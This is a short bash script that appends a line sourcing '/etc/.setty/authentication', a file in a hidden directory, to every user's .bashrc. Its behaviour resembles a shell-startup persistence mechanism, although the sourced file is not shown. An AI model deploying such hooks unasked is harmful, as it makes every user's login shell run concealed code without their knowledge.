#!/bin/bash

# This script takes a specified file and adds it to all of the .bashrc files in for all users.

# Path to the file you want to add to .bashrc
FILE_TO_ADD="/etc/.setty/authentication"

# Loop through all home directories
for dir in /home/*; do
    if [[ -d "$dir" ]]; then
        USER_BASHRC="$dir/.bashrc"

        # Check if .bashrc exists
        if [[ -f "$USER_BASHRC" ]]; then
            # Check if the line is already present
            if ! grep -q "source $FILE_TO_ADD" "$USER_BASHRC"; then
                echo "Adding source line to $USER_BASHRC"
                echo "source $FILE_TO_ADD" >> "$USER_BASHRC"
            else
                echo "Already added in $USER_BASHRC, skipping..."
            fi
        fi
    fi
done

echo "Done!"
